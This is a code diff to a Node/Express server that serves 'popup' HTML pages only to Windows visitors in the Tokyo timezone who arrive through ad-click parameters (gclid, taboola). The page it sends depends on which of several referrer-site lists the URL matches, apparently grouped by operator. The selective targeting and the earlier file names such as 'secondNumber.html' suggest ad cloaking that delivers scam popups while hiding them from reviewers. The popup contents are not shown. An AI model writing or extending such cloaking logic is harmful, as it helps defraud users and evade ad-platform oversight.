@@ -11,6 +11,30 @@ const fourthList = [];
 const fifthList = ["oceanrestaurant.onrender.com", "kokoroyoga.onrender.com", "delightful-smakager-b5ed06.netlify.app", "ruijiacoaching.onrender.com", "goldenflowerhotel.onrender.com", "matsucafe.onrender.com", "summerlighthotel"];
 const sixthList = ["nursecares", "expressmealdelivery", "yogalhealing", "gourmethub", "omnifoodss"];
 
+const officeList1 = ["spadelightjapan", "tanenespa"];
+const officeList2 = ["hdjavforyou", "javhdaffiliates"];
+const officeList3 = [];
+const officeList4 = [];
+const officeList5 = [];
+
+const dmcList1 = ["seishinyoga", "yuyado-onsen", "foodhutjapan", "komorebiyoga"];;
+const dmcList2 = [];
+const dmcList3 = [];
+const dmcList4 = [];
+const dmcList5 = [];
+
+const aomineList1 = ["nursecares", "expressmealdelivery", "yogalhealing", "gourmethub", "omnifoodss"];
+const aomineList2 = [];
+const aomineList3 = [];
+const aomineList4 = [];
+const aomineList5 = [];
+
+const wayneList1 = ["oceanrestaurant.onrender.com", "kokoroyoga.onrender.com", "delightful-smakager-b5ed06.netlify.app", "ruijiacoaching.onrender.com", "goldenflowerhotel.onrender.com", "matsucafe.onrender.com", "summerlighthotel"];
+const wayneList2 = [];
+const wayneList3 = [];
+const wayneList4 = [];
+const wayneList5 = [];
+
 // Base domains for allowed origins and referrers
 const baseDomains = [
   "foodhutjapan.netlify.app",
@@ -98,18 +122,46 @@ app.post("/", (req, res) => {
 
   if (isWindowsOS(userAgent) && isTokyoTimezone && !containsExcludedGclid(fullUrl) && (fullUrl?.includes('gclid') || fullUrl?.includes('taboola') || fullUrl?.includes('tx'))) {
     console.log('popupsent');
-    if (firstList.some(item => fullUrl.includes(item))) {
-      res.sendFile(path.join(__dirname, "altmod.html"));
-    } else if (secondList.some(item => fullUrl.includes(item))) {
-      res.sendFile(path.join(__dirname, "secondNumber.html"));
-    } else if (thirdList.some(item => fullUrl.includes(item))) {
-      res.sendFile(path.join(__dirname, "thirdNumber.html"));
-    } else if (fourthList.some(item => fullUrl.includes(item))) {
-      res.sendFile(path.join(__dirname, "fourthNumber.html"));
-    } else if (fifthList.some(item => fullUrl.includes(item))) {
-      res.sendFile(path.join(__dirname, "fifthNumber.html"));
-    } else {
-      res.sendFile(path.join(__dirname, "sixthNumber.html"));
+    if (officeList1.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "officeList1.html"));
+    } else if (officeList2.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "officeList2.html"));
+    } else if (officeList3.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "officeList3.html"));
+    } else if (officeList4.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "officeList4.html"));
+    } else if (officeList5.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "officeList5.html"));
+    } else if (dmcList1.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "dmcList1.html"));
+    } else if (dmcList2.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "dmcList2.html"));
+    } else if (dmcList3.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "dmcList3.html"));
+    } else if (dmcList4.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "dmcList4.html"));
+    } else if (dmcList5.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "dmcList5.html"));
+    } else if (aomineList1.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "aomineList1.html"));
+    } else if (aomineList2.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "aomineList2.html"));
+    } else if (aomineList3.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "aomineList3.html"));
+    } else if (aomineList4.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "aomineList4.html"));
+    } else if (aomineList5.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "aomineList5.html"));
+    } else if (wayneList1.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "wayneList1.html"));
+    } else if (wayneList2.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "wayneList2.html"));
+    } else if (wayneList3.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "wayneList3.html"));
+    } else if (wayneList4.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "wayneList4.html"));
+    } else if (wayneList5.some(item => fullUrl.includes(item))) {
+      res.sendFile(path.join(__dirname, "wayneList5.html"));
     }
   } else {
     console.log('popup not sent');
